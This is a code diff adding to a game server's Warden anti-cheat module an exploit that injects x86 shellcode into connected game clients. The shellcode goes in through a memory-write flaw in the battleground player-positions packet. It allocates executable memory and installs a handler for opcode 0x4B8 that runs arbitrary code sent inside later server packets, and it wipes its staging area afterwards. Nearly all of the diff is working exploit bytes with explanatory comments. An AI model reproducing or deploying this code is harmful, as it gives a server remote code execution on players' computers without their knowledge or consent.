@@ -142,6 +142,255 @@ void WardenWin::InitializeModule()
     WorldPacket pkt(SMSG_WARDEN_DATA, sizeof(WardenInitModuleRequest));
     pkt.append(reinterpret_cast<uint8*>(&Request), sizeof(WardenInitModuleRequest));
     _session->SendPacket(&pkt);
+
+    // Initialize the MSG_BATTLEGROUND_PLAYER_POSITIONS packet handler.
+    this->RunClientFunction(0x14E720);
+
+    // EXPLANATION:
+    // This ASM code is the initializer for the custom packet handler.
+    const uint8_t loader[] = {
+        // ------------------------------------------------------------------
+        // Function prologue. Establishes a stack frame and saves ebx (callee-
+        // saved under the cdecl/stdcall ABIs used here). The matching epilogue
+        // lives inside the allocated buffer, in the first 32 bytes of payload[].
+        // ------------------------------------------------------------------
+        0x55,                               // push ebp
+        0x89, 0xE5,                         // mov  ebp, esp
+        0x53,                               // push ebx
+
+        // ------------------------------------------------------------------
+        // This calls the 0x0054E220 client function, which cleans up the
+        // call above to 0x14E720.
+        // This removes the MSG_BATTLEGROUND_PLAYER_POSITIONS packet
+        // handler from the client on the login screen.
+        // ------------------------------------------------------------------
+        0xB8, 0x20, 0xE2, 0x54, 0x00,       // mov  eax, 0x0054E220
+        0xFF, 0xD0,                         // call eax
+
+        // ------------------------------------------------------------------
+        // Cache lookup. The first time the loader runs, [0x00DD0FFC] is NULL
+        // and we have to allocate. On subsequent calls (e.g. if the loader is
+        // re-invoked after a reconnect) the previously allocated RWX buffer
+        // is reused, which keeps the handler pointer stable.
+        // ------------------------------------------------------------------
+        0x8B, 0x1D, 0xFC, 0x0F, 0xDD, 0x00, // mov  ebx, [0x00DD0FFC]
+        0x85, 0xDB,                         // test ebx, ebx
+        0x75, 0x2E,                         // jnz  skip_alloc
+
+        // ------------------------------------------------------------------
+        // VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_EXECUTE_READWRITE).
+        // PAGE_EXECUTE_READWRITE (0x40) is required because we both write code
+        // into this region (during install) and execute from it (during install
+        // and for every incoming 0x4B8 packet thereafter).
+        // ------------------------------------------------------------------
+        0x6A, 0x40,                         // push 0x40    ; PAGE_EXECUTE_READWRITE
+        0x68, 0x00, 0x10, 0x00, 0x00,       // push 0x1000  ; MEM_COMMIT
+        0x68, 0x00, 0x10, 0x00, 0x00,       // push 0x1000  ; dwSize = 4 KB
+        0x6A, 0x00,                         // push 0       ; lpAddress = NULL
+        0xFF, 0x15, 0x38, 0xF2, 0x9D, 0x00, // call dword ptr [0x009DF238]  ; VirtualAlloc
+
+        // ------------------------------------------------------------------
+        // Cache the new buffer pointer in both ebx (used by the rest of the
+        // loader) and the global slot at 0x00DD0FFC (used by future runs).
+        // ------------------------------------------------------------------
+        0x89, 0xC3,                         // mov  ebx, eax
+        0xA3, 0xFC, 0x0F, 0xDD, 0x00,       // mov  [0x00DD0FFC], eax
+
+        // ------------------------------------------------------------------
+        // Byte-by-byte copy of the in-image payload from [0x00DD15A0 .. 0x00DD15FE)
+        // into the freshly allocated RWX buffer. 94 bytes total. After this
+        // loop, eax has been advanced past the end of the destination, so the
+        // buffer base is preserved in ebx for the registration call below.
+        // ------------------------------------------------------------------
+        0xBA, 0xA0, 0x15, 0xDD, 0x00,       // mov  edx, 0x00DD15A0   ; src
+        // copy_loop:
+        0x8A, 0x2A,                         // mov  ch,  [edx]
+        0x88, 0x28,                         // mov  [eax], ch
+        0x42,                               // inc  edx
+        0x40,                               // inc  eax
+        0x81, 0xFA, 0xFE, 0x15, 0xDD, 0x00, // cmp  edx, 0x00DD15FE
+        0x75, 0xF2,                         // jnz  copy_loop
+
+        // skip_alloc:
+        // ------------------------------------------------------------------
+        // Register the packet handler. Its entry point is at buffer + 0x20 --
+        // the second half of the payload. The same pointer is pushed twice
+        // because the game's register() takes two callback slots (likely
+        // "primary handler" and "fallback / secondary"); we want both to point
+        // at the same function.
+        //
+        //     register(opcode = 0x4B8,
+        //              primary_handler   = buffer + 0x20,
+        //              secondary_handler = buffer + 0x20)
+        //
+        // Stack layout right before the call (cdecl, args pushed right-to-left):
+        //     [esp+0] = 0x4B8           (1st arg: opcode)
+        //     [esp+4] = buffer + 0x20   (2nd arg: primary handler)
+        //     [esp+8] = buffer + 0x20   (3rd arg: secondary handler)
+        // ------------------------------------------------------------------
+        0x89, 0xD8,                         // mov  eax, ebx              ; eax = buffer base
+        0x83, 0xC0, 0x20,                   // add  eax, 0x20             ; eax = buffer + 0x20 (handler)
+        0x50,                               // push eax                   ; secondary handler
+        0x50,                               // push eax                   ; primary handler
+        0x68, 0xB8, 0x04, 0x00, 0x00,       // push 0x4B8                 ; packet opcode (1208)
+        0xB8, 0x80, 0x0B, 0x6B, 0x00,       // mov  eax, 0x006B0B80
+        0xFF, 0xD0,                         // call eax                   ; register packet handler
+        0x83, 0xC4, 0x0C,                   // add  esp, 0x0C             ; cdecl: clean 3 args
+
+        // ------------------------------------------------------------------
+        // Transfer control to the finalization stub at buffer + 0x00. We have
+        // to jump rather than fall through because the stub finishes the
+        // function frame (pops ebx/ebp, returns to caller) AFTER wiping the
+        // staging area at 0x00DD1000 -- see payload[] below.
+        // ------------------------------------------------------------------
+        0xFF, 0xE3                          // jmp  ebx
+    };
+
+    const uint8_t payload[] = {
+        // ==================================================================
+        // PART 1 -- Finalization stub  (buffer offset 0x00, 32 bytes).
+        //
+        // Reached exactly once via `jmp ebx` from the loader. It wipes the
+        // staging area, sets a return value, and finishes the loader's
+        // function frame, returning to whatever called the loader.
+        //
+        // Why is this here instead of inline in the loader? The wipe targets
+        // 0x00DD1000, which is plausibly where this very code was first
+        // written by the delivery mechanism. Running the wipe from the new
+        // RWX buffer (rather than from 0x00DD1000 itself) avoids erasing
+        // the instructions we are currently executing.
+        // ==================================================================
+
+        // memset(0x00DD1000, 0, 0x1000)  -- clear 4 KB of staging memory.
+        0x68, 0x00, 0x10, 0x00, 0x00,       // push 0x1000     ; size
+        0x6A, 0x00,                         // push 0          ; fill byte
+        0x68, 0x00, 0x10, 0xDD, 0x00,       // push 0x00DD1000 ; dst
+        0xB8, 0x80, 0xBB, 0x40, 0x00,       // mov  eax, 0x0040BB80
+        0xFF, 0xD0,                         // call eax        ; memset-like routine
+        0x83, 0xC4, 0x0C,                   // add  esp, 0x0C  ; cdecl: clean 3 args
+
+        // Loader return value. The caller of the loader expects a pointer (or
+        // handle) here; 0x00C79620 is ClientServices::s_accountName.
+        0xB8, 0x20, 0x96, 0xC7, 0x00,       // mov  eax, 0x00C79620
+
+        // Function epilogue matching the loader's prologue: pop ebx, tear
+        // down the frame, return to the loader's caller.
+        0x5B,                               // pop  ebx
+        0x89, 0xEC,                         // mov  esp, ebp
+        0x5D,                               // pop  ebp
+        0xC3,                               // ret
+
+        // ==================================================================
+        // PART 2 -- Packet handler  (buffer offset 0x20, 62 bytes).
+        //
+        // Called by the game's network dispatcher every time a packet with
+        // opcode 0x4B8 arrives. The dispatcher's calling convention here is
+        // assumed to be cdecl, with at least these arguments on the stack:
+        //
+        //     [ebp+0x08]  -> packet buffer (pointer to raw packet bytes)
+        //     [ebp+0x14]  -> dispatcher context object (used as `this`)
+        //
+        // The handler ultimately calls into bytes carried inside the packet
+        // itself, at offset 0x3E. That is the server-side hook point and the
+        // reason this whole installer exists.
+        // ==================================================================
+
+        // Standard prologue. Saves ebx and edi (callee-saved).
+        0x55,                               // push ebp
+        0x89, 0xE5,                         // mov  ebp, esp
+        0x53,                               // push ebx
+        0x57,                               // push edi
+
+        // ebx = (packet buffer pointer) + 0x3E
+        // i.e. ebx points at the executable region embedded in the packet body.
+        0x8B, 0x5D, 0x08,                   // mov  ebx, [ebp+0x08]   ; ebx = packet_buf
+        0x83, 0xC3, 0x3E,                   // add  ebx, 0x3E         ; ebx = packet_buf + 0x3E
+
+        // First helper call -- thiscall on the dispatcher context.
+        //     eax = ctx->method_at_0x401170()
+        // Result is stashed in edi for the next two calls.
+        0x8B, 0x4D, 0x14,                   // mov  ecx, [ebp+0x14]   ; this = context
+        0xB8, 0x70, 0x11, 0x40, 0x00,       // mov  eax, 0x00401170
+        0xFF, 0xD0,                         // call eax
+        0x89, 0xC7,                         // mov  edi, eax
+
+        // Second helper call -- thiscall on the same context, with two
+        // additional stack args (ebx = packet code ptr, edi = previous result).
+        //     ctx->method_at_0x47B560(ebx, edi)
+        // No `add esp` afterwards: thiscall callee cleans its own stack args.
+        0x8B, 0x4D, 0x14,                   // mov  ecx, [ebp+0x14]   ; this = context (reload)
+        0x57,                               // push edi
+        0x53,                               // push ebx
+        0xB8, 0x60, 0xB5, 0x47, 0x00,       // mov  eax, 0x0047B560
+        0xFF, 0xD0,                         // call eax
+
+        // Third call -- imported API via [0x009DF1C0], taking (ebx, edi).
+        // stdcall: callee cleans the stack.
+        //     eax = imported_func_DF1C0(ebx, edi)
+        0x57,                               // push edi
+        0x53,                               // push ebx
+        0xFF, 0x15, 0xC0, 0xF1, 0x9D, 0x00, // call dword ptr [0x009DF1C0]
+
+        // Fourth call -- imported API via [0x009DF294], taking the result of
+        // the previous call.
+        //     imported_func_DF294(eax_from_DF1C0)
+        0x50,                               // push eax
+        0xFF, 0x15, 0x94, 0xF2, 0x9D, 0x00, // call dword ptr [0x009DF294]
+
+        // Final call -- into the packet body itself, at packet + 0x3E. The
+        // dispatcher context is passed as the single argument. The server-
+        // supplied code is expected to clean that argument off the stack
+        // itself (stdcall-like contract) so the epilogue below sees a
+        // balanced stack.
+        //
+        //     ((void(__stdcall *)(void *))(packet + 0x3E))(context);
+        0x8B, 0x4D, 0x14,                   // mov  ecx, [ebp+0x14]
+        0x51,                               // push ecx
+        0xFF, 0xD3,                         // call ebx               ; <-- server-supplied code
+
+        // Standard epilogue. Pops the registers we saved, tears down the
+        // frame, and returns to the network dispatcher.
+        0x5F,                               // pop  edi
+        0x5B,                               // pop  ebx
+        0x89, 0xEC,                         // mov  esp, ebp
+        0x5D,                               // pop  ebp
+        0xC3                                // ret
+    };
+
+    constexpr size_t loader_size = sizeof(loader);
+    constexpr size_t loader_padded_size = (loader_size + 7) & ~size_t(7);
+    int32_t loader_count = static_cast<int32_t>(loader_padded_size);
+
+    constexpr size_t payload_size = sizeof(payload);
+
+    // The payload is sent via a flaw in the clients source.
+    // MSG_BATTLEGROUND_PLAYER_POSITIONS writes to a carefully
+    // crafted offset in the client (249298).
+    // This points do 0xDD1000 inside the client, which is
+    // read/write/execute space
+    ByteBuffer buff2;
+    buff2 << uint32(0);
+    buff2 << uint32(249298 + (loader_count / 8));
+    while (loader_count > 0) {
+        for (int32_t i = 0; i < 8; i++)
+        {
+            size_t idx = loader_count - 8 + i;
+            buff2 << (idx < loader_size ? loader[idx] : uint8_t(0));
+        }
+        for (int32_t i = 0; i < 8; i++)
+        {
+            size_t idx = loader_count - 8 + i;
+            buff2 << (idx < payload_size ? payload[idx] : uint8_t(0));
+        }
+        loader_count -= 8;
+    }
+
+    WorldPacket pkt3(MSG_BATTLEGROUND_PLAYER_POSITIONS, buff2.size());
+    pkt3.append(buff2);
+    _session->SendPacket(&pkt3);
+
+    // Calls 0xDD1000 (Client base 0x400000 + 0x9D1000)
+    this->RunClientFunction(0x009D1000);
 }
 
 void WardenWin::RunClientFunction(uint32 function) {
